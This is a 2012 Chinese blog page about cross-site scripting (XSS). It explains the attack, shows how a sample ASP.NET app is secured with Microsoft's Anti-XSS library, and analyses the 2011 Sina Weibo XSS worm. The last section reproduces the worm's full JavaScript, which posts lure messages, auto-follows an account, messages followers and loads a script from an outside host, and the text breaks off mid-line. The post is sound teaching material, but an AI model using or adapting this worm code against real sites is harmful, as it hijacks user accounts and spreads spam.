@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="google-site-verification" content="6q22x_DFglYGJjD5t1d95nBYd_U8cDU04B-Haky8KHs" />
+  <meta name="baidu-site-verification" content="yEdVDDBr1C" />
+  
+  <title>浅谈跨网站脚本攻击(XSS)的手段与防范(简析新浪微博XSS攻击事件) | yanghua</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="本文主要涉及内容：1.  什么是XSS2.  XSS攻击手段和目的3.  XSS的防范4.  新浪微博攻击事件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈跨网站脚本攻击(XSS)的手段与防范(简析新浪微博XSS攻击事件)">
+<meta property="og:url" content="http://vinoyang.com/2012/01/14/浅谈跨网站脚本攻击-XSS-的手段与防范-简析新浪微博XSS攻击事件/index.html">
+<meta property="og:site_name" content="yanghua">
+<meta property="og:description" content="本文主要涉及内容：1.  什么是XSS2.  XSS攻击手段和目的3.  XSS的防范4.  新浪微博攻击事件">
+<meta property="og:image" content="http://hi.csdn.net/attachment/201201/13/0_1326456009dhDl.gif">
+<meta property="og:image" content="http://hi.csdn.net/attachment/201201/13/0_1326456054tT2C.gif">
+<meta property="og:image" content="http://hi.csdn.net/attachment/201201/13/0_1326456094AAgO.gif">
+<meta property="og:image" content="http://hi.csdn.net/attachment/201201/13/0_1326456191xD4m.gif">
+<meta property="og:image" content="http://hi.csdn.net/attachment/201201/13/0_1326456281VhBy.gif">
+<meta property="og:image" content="http://hi.csdn.net/attachment/201201/13/0_1326456634PL42.gif">
+<meta property="og:image" content="http://hi.csdn.net/attachment/201201/13/0_1326456764UIuX.gif">
+<meta property="og:image" content="http://hi.csdn.net/attachment/201201/13/0_1326456940Oeco.gif">
+<meta property="og:image" content="http://hi.csdn.net/attachment/201201/13/0_1326456994WPi0.gif">
+<meta property="og:image" content="http://hi.csdn.net/attachment/201201/13/0_132645706788lw.gif">
+<meta property="og:updated_time" content="2015-11-27T05:26:27.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="浅谈跨网站脚本攻击(XSS)的手段与防范(简析新浪微博XSS攻击事件)">
+<meta name="twitter:description" content="本文主要涉及内容：1.  什么是XSS2.  XSS攻击手段和目的3.  XSS的防范4.  新浪微博攻击事件">
+  
+    <link rel="alternative" href="/atom.xml" title="yanghua" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <!-- <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css"> -->
+  <link rel="stylesheet" href="/css/style.css" type="text/css">
+  
+
+</head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">yanghua</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">alone coder</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/projects">Projects</a>
+        
+          <a class="main-nav-link" href="/about">About</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-github-link" class="nav-icon" href="https://github.com/yanghua" target="_blank" title="GitHub"></a>
+        
+        
+          <a id="nav-weibo-link" class="nav-icon" href="http://weibo.com/yanghua1127" target="_blank" title="Sina Weibo"></a>
+        
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://vinoyang.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-浅谈跨网站脚本攻击-XSS-的手段与防范-简析新浪微博XSS攻击事件" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2012/01/14/浅谈跨网站脚本攻击-XSS-的手段与防范-简析新浪微博XSS攻击事件/" class="article-date">
+  <time datetime="2012-01-13T20:16:00.000Z" itemprop="datePublished">2012-01-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      浅谈跨网站脚本攻击(XSS)的手段与防范(简析新浪微博XSS攻击事件)
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <!-- Table of Contents -->
+        
+        <div><br><br><span style="font-size:16px"><strong>本文主要涉及内容：</strong></span><br><br>1.  <span style="font-size:16px">什么是XSS</span><br>2.  <span style="font-size:16px">XSS攻击手段和目的</span><br>3.  <span style="font-size:16px">XSS的防范</span><br>4.  <span style="font-size:16px">新浪微博攻击事件</span><br><br><a id="more"></a><br><br><strong><span style="font-size:18px"><br><br></span></strong><br><br><strong><span style="font-size:18px">什么是XSS</span></strong><br><br>跨网站脚本（Cross-sitescripting，通常简称为XSS或跨站脚本或跨站脚本攻击）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了HTML以及用户端脚本语言。<br><br>XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java， VBScript， ActiveX， Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。<br><br><strong><span style="font-size:18px">XSS攻击手段和目的</span></strong><br><br>攻击者使被攻击者在浏览器中执行脚本后，如果需要收集来自被攻击者的数据（如cookie或其他敏感信息），可以自行架设一个网站，让被攻击者通过JavaScript等方式把收集好的数据作为参数提交，随后以数据库等形式记录在攻击者自己的服务器上。<br><br>常用的XSS攻击手段和目的有：<br><br><em>   &nbsp;盗用 cookie ，获取敏感信息。
+</em>   &nbsp;利用植入 Flash ，通过 crossdomain 权限设置进一步获取更高权限；或者利用Java等得到类&#20284;的操作。<br><em>   利用 iframe、frame、XMLHttpRequest或上述Flash等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。
+</em>   利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。<br><em>   在访问量极大的一些页面上的XSS可以攻击一些小型网站，实现DDoS攻击的效果。<br><br><strong><span style="font-size:18px">预防手段【asp.net】</span></strong><br><br>下面展示，如何使用微软Anti-Cross Site 类库来免受XSS攻击。该类库不同于大部分采用包裹原则技术的编码类库来避免XSS攻击。它通过定义一个验证或被允许的字符集来工作，并且编码任何该字符集之外的一切字符（比如他们就可能使无效字符或潜在的攻击）。它提供了比其他编码模式更多的优势。<br><br><strong><span style="font-size:16px">示例应用</span></strong><br><br>Contoso Bookmark Page 是一个简单的web应用，被设计用来允许朋友之间共享他们最喜欢的书签。用户键入他们的名字，描述以及书签或者书签的链接<br><br><img src="http://hi.csdn.net/attachment/201201/13/0_1326456009dhDl.gif" alt=""><br><br>数据被保存在App Dataweb应用程序的一个称之为bookmarks.txt的文件中。并且在应用程序显示任何已被保存的书签时读取。当一个书签被提交，用户将看到下面的显示，然后被提供一个链接来回到原来的页面。<br><br><img src="http://hi.csdn.net/attachment/201201/13/0_1326456054tT2C.gif" alt=""><br><br>如果应用程序成功地保存了用户提供的数据，书签的列表将被更新，任何其他的使用该应用的用户都可以使用这些被保存的书签。<br><br><img src="http://hi.csdn.net/attachment/201201/13/0_1326456094AAgO.gif" alt=""><br><br>最终用户可以通过点击“DeleteBookmark File”来重置书签文件，这将导致bookmarks.txt文件从硬盘上删除。<br><br>&nbsp;<br><br><strong><span style="font-size:16px">攻击该应用</span></strong><br><br>为了让一个恶意用户对应用发起XSS攻击，它们首先需要找到一些攻击的先决条件：
+
+</em>   该应用是不验证输入的<br><em>   该应用不对输出编码并且其中包含了一些不可信的输入<br><br>Contoso Bookmark Page应用的一个区域——感谢页面，就符合上面的这些“攻击条件”。当一个用户提交一个链接并且数据被保存，应用会通过响应提交的内容来“感谢”用户。<br><br><img src="http://hi.csdn.net/attachment/201201/13/0_1326456191xD4m.gif" alt=""><br><br>注意，感谢页面的输出是通过使用没有验证的不可信的用户输入，并且在响应数据中使用了该输入而没有进行编码。对感谢页面代码的快速检查可以证明这一点。<br><br>一个恶意用户可以简单地利用该XSS攻击条件，通过欺骗用户来访问ThankYou.aspx页面，于此同时传入诸如&lt;script&gt;alert(‘XSSVector!’)&lt;/script&gt;到用户名字段中。<br><br><img src="http://hi.csdn.net/attachment/201201/13/0_1326456281VhBy.gif" alt=""><br><br>就像你上面看到的那样，脚本被恶意用户注入并在信任的用户浏览器中被执行。<br><br>下面一节，我们将通过一个正式的过程来识别或减轻这些问题。<br><br>注意：在XSS载体已经实施后之后，发现这些问题将会变得很快且很有价&#20540;。但如果有一种方式在软件开发的生命周期内致力于在任何代码执行或资源提交之前做早期预测以及历届应用程序的威胁，这样的代价岂不是非常巨大？是的，而且这是一个过程，我们在这里使用微软IT所谓的“威胁建模”来称呼它。<br><br><strong><span style="font-size:16px">保护你的应用</span></strong><br><br>为了保护ContosoBookmark Page应用免受攻击，我们首先需要理解恶意用户能够使用哪些手段来进行这样的攻击。一种不错的想法是，我们应该在设计的时候就应该留意它，使用威胁建模以及一个诸如TAM的工具。我们在应用程序已经被部署之后，使用如下步骤来处理：
+
+</em>   步骤一：审查asp.net代码生成的输出<br><em>   步骤二：决定是否输出包含危险的输入参数
+</em>   步骤三：决定是否将不被信任的输入上下文作为输出使用<br><em>   步骤四：对输出编码<br><br>在这一节，我们将使用示例应用来贯穿这些步骤，然后看看我们应该怎样使用微软的Anti-Cross Site Scripting类库 V1.5来避免用户遭受XSS攻击。<br><br><strong><span style="font-size:16px">步骤一：审查asp.net生成输出的代码</span></strong><br><br>记住，为了完成一次成功得XSS攻击，恶意用户必须找到一种方式在应用程序的输出数据中嵌入他们的某些恶意输入。因此，我们需要识别出应用程序中产生输出的代码。这通常不是一件非常简单的任务，特别对那些大型项目而言，并且有些输出可能确实不必要进行编码。这些情况下，下面的表&#26684;可以帮助你处理这些大量数据：<br><br><table border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td valign="top"><br><p>用例场景<br><br></p></td><br><td valign="top"><br><br>场景输入<br><br></td><br><td valign="top"><br><br>输入可信？<br><br></td><br><td valign="top"><br><br>场景输出<br><br></td><br><td valign="top"><br><br>输出中包含不可信的输入？<br><br></td><br><td valign="top"><br><br>需要编码？<br><br></td><br><td valign="top"><br><br>使用编码方法<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>&nbsp;<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br><td valign="top"><br><br>Yes/no<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br><td valign="top"><br><br>Yes/no<br><br></td><br><td valign="top"><br><br>Yes/no<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br></tr><br></tbody><br></table><br><p></p><br><br>为了正确使用该表&#26684;，我们首先要知道我们的应用是干嘛的。表&#26684;中的一些项我们可以立即填写：
+
+</em>   &nbsp; 用例场景<br><em>   &nbsp; 用例场景需要的输入
+</em>   &nbsp; 输入是否可信<br><em>   &nbsp; 场景的输出<br><br>注意：如果你不确信输入是否可信，宁可谨慎一点，假设他们是不可信的。不可信的输入包括：<br><br>&nbsp; 应用程序级别的全局变量
+
+</em>   &nbsp; Cookies<br><em>   &nbsp; 数据库
+</em>   &nbsp; 表单字段<br><em>   &nbsp; 查询字符串变量
+</em>   &nbsp; Session变量<br><br>基于我们的示例项目，这里我们对该表&#26684;可以这样填写：<br><br><table border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td valign="top"><br><br>用例场景<br><br></td><br><td valign="top"><br><br>场景输入<br><br></td><br><td valign="top"><br><br>输入可信？<br><br></td><br><td valign="top"><br><br>场景输出<br><br></td><br><td valign="top"><br><br>输出中包含不可信的输入？<br><br></td><br><td valign="top"><br><br>需要编码？<br><br></td><br><td valign="top"><br><br>使用编码方法<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>用户添加书签<br><br></td><br><td valign="top"><br><br>用户名、描述、书签<br><br></td><br><td valign="top"><br><br>no<br><br></td><br><td valign="top"><br><br>写入文件的书签实体<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>应用程序“答谢”用户<br><br></td><br><td valign="top"><br><br>用户名称<br><br></td><br><td valign="top"><br><br>No<br><br></td><br><td valign="top"><br><br>感谢信息页面<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br></tr><br></tbody><br></table><br><br>这时，当我们客观地填写了该表&#26684;，我们就可以很直观地看出，代码中有哪些是完成输出的：<br><br><em>   &nbsp;将书签实体写入文件的代码
+</em>   &nbsp;为用户生成感谢信息页面的代码<br><br><strong><span style="font-size:16px">步骤二：决定是否输出中包含不可信的输入</span></strong><br><br>在该步骤中，我们的目标是确定，是否在上一步筛选的输出中是否包含有任何不可信的用户输入。基于输入和输出场景，现在我们的表&#26684;看起来就像如下这样：<br><br><table border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td valign="top"><br><br>用例场景<br><br></td><br><td valign="top"><br><br>场景输入<br><br></td><br><td valign="top"><br><br>输入可信？<br><br></td><br><td valign="top"><br><br>场景输出<br><br></td><br><td valign="top"><br><br>输出中包含不可信的输入？<br><br></td><br><td valign="top"><br><br>需要编码？<br><br></td><br><td valign="top"><br><br>使用编码方法<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>用户添加书签<br><br></td><br><td valign="top"><br><br>用户名、描述、书签<br><br></td><br><td valign="top"><br><br>no<br><br></td><br><td valign="top"><br><br>写入文件的书签实体<br><br></td><br><td valign="top"><br><br>Yes<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>应用程序“答谢”用户<br><br></td><br><td valign="top"><br><br>用户名称<br><br></td><br><td valign="top"><br><br>No<br><br></td><br><td valign="top"><br><br>感谢信息页面<br><br></td><br><td valign="top"><br><br>yes<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br></tr><br></tbody><br></table><br><br>注意：如果你不确定输出中是否包含不确定的输入，保险点，假设他们都是不可信的。<br><br>&nbsp;<br><br><strong><span style="font-size:16px">步骤三：决定是否使用编码函数</span></strong><br><br>在该步骤，我们的目标是理解我们需要采用哪个编码方法来编码我们的响应数据。如果在表&#26684;中下面的条件完全满足，那么输出就有编码的必要：<br><br><em>   &nbsp; 输入不可信(第三列有一个No输出)
+</em>   &nbsp; 输出包含不可信的输入(第五列有一个yes输出)<br><em>   &nbsp; 输出在web响应数据的上下文中使用<br><br><table border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td valign="top"><br><br>用例场景<br><br></td><br><td valign="top"><br><br>场景输入<br><br></td><br><td valign="top"><br><br>输入可信？<br><br></td><br><td valign="top"><br><br>场景输出<br><br></td><br><td valign="top"><br><br>输出中包含不可信的输入？<br><br></td><br><td valign="top"><br><br>需要编码？<br><br></td><br><td valign="top"><br><br>使用编码方法<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>用户添加书签<br><br></td><br><td valign="top"><br><br>用户名、描述、书签<br><br></td><br><td valign="top"><br><br>no<br><br></td><br><td valign="top"><br><br>写入文件的书签实体<br><br></td><br><td valign="top"><br><br>Yes<br><br></td><br><td valign="top"><br><br>No(输出被写入文件而不是web响应的数据)<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>应用程序“答谢”用户<br><br></td><br><td valign="top"><br><br>用户名称<br><br></td><br><td valign="top"><br><br>No<br><br></td><br><td valign="top"><br><br>感谢信息页面<br><br></td><br><td valign="top"><br><br>yes<br><br></td><br><td valign="top"><br><br>yes<br><br></td><br><td valign="top"><br><br>&nbsp;<br><br></td><br></tr><br></tbody><br></table><br><br>最终，我们需要决定使用哪个编码函数。接下来的表&#26684;将帮助你决定使用哪个编码函数：<br><br><table border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td valign="top"><br><br>编码函数<br><br></td><br><td valign="top"><br><br>应该使用的场景<br><br></td><br><td valign="top"><br><br>示例/模式<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>HtmlEncode<br><br></td><br><td valign="top"><br><br>不可信的输入被用作html输出，被分配给一个html属性除外<br><br></td><br><td valign="top"><br><br>&lt;a href=&quot;<a href="http://www.contoso.com&quot;&gt;Click" target="_blank" rel="external">http://www.contoso.com&quot;&gt;Click</a> Here [Untrusted input]&lt;/a&gt;<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>HtmlAttributeEncode<br><br></td><br><td valign="top"><br><br>不可信的输入作为一个html属性<br><br></td><br><td valign="top"><br><br>&lt;hr noshade size=[Untrusted input]&gt;<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>JavaScriptEncode<br><br></td><br><td valign="top"><br><br>不可信的输入作为一个javascript上下文<br><br></td><br><td valign="top"><br><br>&lt;script type=&quot;text/javascript&quot;&gt;<br><br>…<br><br>[Untrusted input]<br><br>…<br><br>&lt;/script&gt;<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>UrlEncode<br><br></td><br><td valign="top"><br><br>不可信的输入作为一个url(例如作为一个查询参数的&#20540;)<br><br></td><br><td valign="top"><br><br>&lt;a href=&quot;<a href="http://search.msn.com/results.aspx?" target="_blank" rel="external">http://search.msn.com/results.aspx?</a><br><br>q=[Untrusted-input]&quot;&gt;Click Here!&lt;/a&gt;<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>VisualBasicScriptEncode<br><br></td><br><td valign="top"><br><br>不可信的输入作为一个visual basic上下文<br><br></td><br><td valign="top"><br><br>&lt;script type=&quot;text/vbscript&quot; language=&quot;vbscript&quot;&gt;<br><br>…<br><br>[Untrusted input]<br><br>…<br><br>&lt;/script&gt;<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>XmlEncode<br><br></td><br><td valign="top"><br><br>不可信的输入作为一个xml输出，除了把它作为一个xml节点的属性<br><br></td><br><td valign="top"><br><br>&lt;xml_tag&gt;[Untrusted input]&lt;/xml_tag&gt;<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>XmlAttributeEncode<br><br></td><br><td valign="top"><br><br>不可信的输入作为一个xml的属性<br><br></td><br><td valign="top"><br><br>&lt;xml_tag attribute=[Untrusted input]&gt;Some Text&lt;/xml_tag&gt;<br><br></td><br></tr><br></tbody><br></table><br><br>我们最终的表&#26684;看起来变成下面的样子：<br><br><table border="1" cellspacing="0" cellpadding="0"><br><tbody><br><tr><br><td valign="top"><br><br>用例场景<br><br></td><br><td valign="top"><br><br>场景输入<br><br></td><br><td valign="top"><br><br>输入可信？<br><br></td><br><td valign="top"><br><br>场景输出<br><br></td><br><td valign="top"><br><br>输出中包含不可信的输入？<br><br></td><br><td valign="top"><br><br>需要编码？<br><br></td><br><td valign="top"><br><br>使用编码方法<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>用户添加书签<br><br></td><br><td valign="top"><br><br>用户名、描述、书签<br><br></td><br><td valign="top"><br><br>no<br><br></td><br><td valign="top"><br><br>写入文件的书签实体<br><br></td><br><td valign="top"><br><br>Yes<br><br></td><br><td valign="top"><br><br>No(输出被写入文件而不是web响应的数据)<br><br></td><br><td valign="top"><br><br>m/a<br><br></td><br></tr><br><tr><br><td valign="top"><br><br>应用程序“答谢”用户<br><br></td><br><td valign="top"><br><br>用户名称<br><br></td><br><td valign="top"><br><br>No<br><br></td><br><td valign="top"><br><br>感谢信息页面<br><br></td><br><td valign="top"><br><br>yes<br><br></td><br><td valign="top"><br><br>yes<br><br></td><br><td valign="top"><br><br>用户名(当我们写入HTML上下文中时采用HtmlEncode)<br><br></td><br></tr><br></tbody><br></table><br><br>根据我们的表&#26684;，我们仅需要编码不可信的输入。<br><br>&nbsp;<br><br><strong><span style="font-size:16px">步骤四：编码输出</span></strong><br><br>现在，我们已经决定了在什么场景下需要编码，其他需要做的就是将微软的Anti-Cross Site 类库加入到我们的项目中取，然后编码不可信的输入并将其内嵌到响应数据中。<br><br>在你安装了微软的Anti-CrossSite scripting类库之后，你可以通过如下步骤将引用添加到你的asp.net应用中去。<br><br>1、&nbsp;右击项目名称<br><br>2、&nbsp;选择添加引用选项<br><br>3、&nbsp;在浏览弹出框中，选择安装的类库目录（%program files%\Microsoft Corporation\Anti-Cross Site ScriptingLibrary V1.5\Library[.NET 1.1|.NET 2.0]）然后将dll添加到项目中。<br><br>&nbsp;<img src="http://hi.csdn.net/attachment/201201/13/0_1326456634PL42.gif" alt=""><br><br>当我们已经添加了对Anti-CrossSite scripting类库的引用之后，我们就可以对感谢页面的输出进行编码。<br><br>1、&nbsp;打开ThankYou.aspx的code-behind页面<br><br>2、&nbsp;直接在引用中添加Microsift.Security.Application<br><br>3、在页面的Page_Load方法中，替代接下来的代码：<br><br><pre name="code" class="plain">// Get the query string parameter ‘Name’, if it wasn’t specified don’t write anything<br>String Name = Request.QueryString[&quot;Name&quot;];</pre>替代<br><br><pre name="code" class="sql">// Get the query string parameter ‘Name’, if it wasn’t specified don’t write anything<br>String Name = AntiXss.HtmlEncode(Request.QueryString[&quot;Name&quot;]);</pre><br><br>4、&nbsp;重新编译web应用<br><br>现在任何企图通过注入脚本到Name查询字符串字段的方式将会失败，因为不信任的数据以及被AntiXss.HtmlEncode方法嵌入到一个不可知性的表单中去了。<br><br><img src="http://hi.csdn.net/attachment/201201/13/0_1326456764UIuX.gif" alt=""><br><br>注意：一个通常的错误是编码不止一次是错误的。这经常会导致输入显示得不正确。例如，一个Hello Microsoft！的输入，被传入Microsoft.Security.Application.AntiXss.HtmlEncode方法中两次，将会导致浏览器打印出<strong>HelloMicrosoft&amp;#38;&amp;#35;33&amp;#59;</strong>记住，你只需对不可信的输入编码一次即可。<br><br><strong>&nbsp;</strong><br><br><strong><span style="font-size:16px">深度剖析</span></strong><br><br>为了使恶意用户的攻击变得更加困难，这里有一个定义能够防止更深度的XSS恶意攻击。
+
+</em>   将asp.net的validateRequest属性设置为true<br><div><pre name="code" class="plain">&lt;%@ Page Language=&quot;C#&quot; AutoEventWireup=&quot;true&quot; CodeFile=&quot;ThankYou.aspx.cs&quot; Inherits=&quot;ThankYou&quot;<br>   validateRequest=&quot;true&quot; %&gt;</pre><br><br><em>   &nbsp;对所有的用户输入执行验证。
+</em>   &nbsp;当不与XSS攻击有关的时候，一个额外的步骤可以帮助我们减少被攻击的危险，通过在应用程序启动的时候，给其设置一个更低级别的权限。在默认情况下，应用程序是以完全信任的方式启动的。所以，当一个恶意用户访问应用的时候，他也是以一个完全可信的权限来执行相关操作。我们的应用简单地创建一个文件或者向一个文件执行写操作或者读操作，这不需要完全信任的权限来执行这些。我们可以降低它的信任级别到“中级”通过在配置文件中进行如下设置。<br><br><pre name="code" class="html">&lt;?xml version=&quot;1.0&quot;?&gt;<br>&lt;configuration xmlns=&quot;<a href="http://schemas.microsoft.com/.NetConfiguration/v2.0&quot;&amp;gt" target="_blank" rel="external">http://schemas.microsoft.com/.NetConfiguration/v2.0&quot;&amp;gt</a>;<br>    &lt;system.web&gt;<br>         &lt;!– Lowers trust level of application to only what we need, instead of full –&gt;<br>         &lt;trust level=&quot;Medium&quot;/&gt;<br>    &lt;/system.web&gt;<br>&lt;/configuration&gt;</pre><br><br><strong><span style="font-size:16px">另外的XSS攻击</span></strong><br><br>我们忘记了一种用例场景。那就是用户看到的正确加载书签的地方（例如，另一个用户简单地导航到主页面）。在这种情况下，该场景的输入是bookmarks.txt文件。就算我们解决了感谢页面的问题，数据（诸如的脚本等）仍然被保存到了bookmarks.txt中。<br><br><img src="http://hi.csdn.net/attachment/201201/13/0_1326456940Oeco.gif" alt=""><br><br></div><br><div><br><br>当用户刷新主页面以及打印出来的书签，注入的脚本仍将被执行。<br><br><img src="http://hi.csdn.net/attachment/201201/13/0_1326456994WPi0.gif" alt=""><br><br></div><br><div><br><br>注意，用户也能够将脚本注入到描述以及书签字段，而不仅仅只是名称字段。我们需要编码任何我们需要从书签文件中读取的数据，因为我们将打印到浏览器上。<br><br><strong><span style="font-size:18px">新浪微博的攻击事件</span></strong><br><br>（2011年6月28日），新浪微博出现了一次比较大的XSS攻击事件。大量用户自动发送诸如：“郭美美事件的一些未注意到的细节”，“建党大业中穿帮的地方”，“让女人心动的100句诗歌”，“3D肉团团高清普通话版种子”，“这是传说中的神仙眷侣啊”，“惊爆!范冰冰艳照真流出了”等等微博和私信，并自动关注一位名为hellosamy的用户。<br><br>事件的经过线索如下：<br><br>20:14，开始有大量带V的认证用户中招转发蠕虫<br><br>20:30，2kt.cn中的病毒页面无法访问<br><br>20:32，新浪微博中hellosamy用户无法访问<br><br>21:02，新浪漏洞修补完毕<br><br><img src="http://hi.csdn.net/attachment/201201/13/0_132645706788lw.gif" alt=""><br><br><strong><span style="font-size:16px">XSS攻击代码简析</span></strong><br><br><pre name="code" class="javascript">function createXHR(){<br>return window.XMLHttpRequest?<br>new XMLHttpRequest():<br>new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);<br>}<br>function getappkey(url){<br>xmlHttp = createXHR();<br>xmlHttp.open(&quot;GET&quot;,url,false);<br>xmlHttp.send();<br>result = xmlHttp.responseText;<br>id_arr = ‘’;<br>id = result.match(/namecard=\&quot;true\&quot; title=\&quot;[^\&quot;]<em>/g);<br>for(i=0;i&lt;id.length;i++){<br>sum = id[i].toString().split(‘&quot;’)[3];<br>id_arr += sum + ‘||’;<br>}<br>return id_arr;<br>}<br>function random_msg(){<br>link = ‘ <a href="http://163.fm/PxZHoxn?id=" target="_blank" rel="external">http://163.fm/PxZHoxn?id=</a>‘ + new Date().getTime();;<br>var msgs = [<br>‘郭美美事件的一些未注意到的细节：’,<br>‘建党大业中穿帮的地方：’,<br>‘让女人心动的100句诗歌：’,<br>‘3D肉团团高清普通话版种子：’,<br>‘这是传说中的神仙眷侣啊：’,<br>‘惊爆!范冰冰艳照真流出了：’,<br>‘杨幂被爆多次被潜规则:’,<br>‘傻仔拿锤子去抢银行：’,<br>‘可以监听别人手机的软件：’,<br>‘个税起征点有望提到4000：’];<br>var msg = msgs[Math.floor(Math.random()</em>msgs.length)] + link;<br>msg = encodeURIComponent(msg);<br>return msg;<br>}<br>function post(url,data,sync){<br>xmlHttp = createXHR();<br>    xmlHttp.open(&quot;POST&quot;,url,sync);<br>    xmlHttp.setRequestHeader(&quot;Accept&quot;,&quot;text/html,application/xhtml+xml,application/xml;q=0.9,<em>/</em>;q=0.8&quot;);<br>    xmlHttp.setRequestHeader(&quot;Content-Type&quot;,&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;);<br>    xmlHttp.send(data);<br>}<br>function publish(){<br>url = ‘<a href="http://weibo.com/mblog/publish.php?rnd=" target="_blank" rel="external">http://weibo.com/mblog/publish.php?rnd=</a>‘ + new Date().getTime();<br>data = ‘content=’ + random_msg() + ‘&amp;pic=&amp;styleid=2&amp;retcode=’;<br>post(url,data,true);<br>}<br>function follow(){<br>url = ‘<a href="http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=" target="_blank" rel="external">http://weibo.com/attention/aj_addfollow.php?refer_sort=profile&amp;atnId=profile&amp;rnd=</a>‘ + new Date().getTime();<br>data = ‘uid=’ + 2201270010 + ‘&amp;fromuid=’ + $CONFIG.$uid + ‘&amp;refer_sort=profile&amp;atnId=profile’;<br>post(url,data,true);<br>}<br>function message(){<br>url = ‘<a href="http://weibo.com/" target="_blank" rel="external">http://weibo.com/</a>‘ + $CONFIG.$uid + ‘/follow’;<br>ids = getappkey(url);<br>id = ids.split(‘||’);<br>for(i=0;i&lt;id.length - 1 &amp; i&lt;5;i++){<br>msgurl = ‘<a href="http://weibo.com/message/addmsg.php?rnd=" target="_blank" rel="external">http://weibo.com/message/addmsg.php?rnd=</a>‘ + new Date().getTime();<br>msg = random_msg();<br>msg = encodeURIComponent(msg);<br>user = encodeURIComponent(encodeURIComponent(id[i]));<br>data = ‘content=’ + msg + ‘&amp;name=’ + user + ‘&amp;retcode=’;<br>post(msgurl,data,false);<br>}<br>}<br>function main(){<br>try{<br>publish();<br>}<br>catch(e){}<br>try{<br>follow();<br>}<br>catch(e){}<br>try{<br>message();<br>}<br>catch(e){}<br>}<br>try{<br>   x=&quot;g=document.createElement(‘script’);g.src=’<a href="http://www.2kt.cn/images/t.js&#39;;document.body.appendChild(g)&quot;;window.opener.eval(x" target="_blank" rel="external">http://www.2kt.cn/images/t.js&#39;;document.body.appendChild(g)&quot;;window.opener.eval(x</a>);<br>}<br>catch(e){}<br>main();<br>var t=setTimeout(‘location=&quot;<a href="http://weibo.com/pub/topic&quot;;&#39;,5000" target="_blank" 